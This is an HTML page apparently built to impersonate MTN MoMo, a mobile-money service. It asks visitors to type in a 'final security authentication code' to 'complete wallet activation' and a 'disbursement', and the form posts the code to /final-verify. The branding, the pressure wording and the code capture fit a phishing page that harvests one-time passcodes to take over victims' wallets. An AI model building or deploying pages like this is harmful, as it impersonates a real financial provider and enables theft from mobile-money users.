<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Final Authentication - MTN MoMo</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #003366; color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: sans-serif; }
        .momo-box { max-width: 480px; width: 100%; background: #002244; border-radius: 16px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
        .momo-logo { background-color: #FFCC00; color: #003366; font-weight: 900; font-size: 20px; padding: 4px 10px; border-radius: 8px; display: inline-block; }
    </style>
</head>
<body class="p-3 text-center">
    <div class="momo-box">
        <div class="momo-logo mb-3">MM</div>
        <h4 class="fw-bold mb-2">Final Authentication</h4>
        <p class="text-white-50 small mb-4">
            Please enter the final security authentication code sent directly from our system to complete your wallet activation.
        </p>
        
        <form action="/final-verify" method="POST">
            <div class="mb-3 text-start">
                <label class="form-label small text-warning fw-bold">Enter Final System Code:</label>
                <input 
                    type="text" 
                    class="form-control text-center font-monospace py-3" 
                    name="final_code" 
                    placeholder="Enter security code..." 
                    required>
            </div>
            <button type="submit" class="btn btn-warning w-100 py-3 fw-bold text-dark">COMPLETE DISBURSEMENT</button>
        </form>
    </div>
</body>
</html>
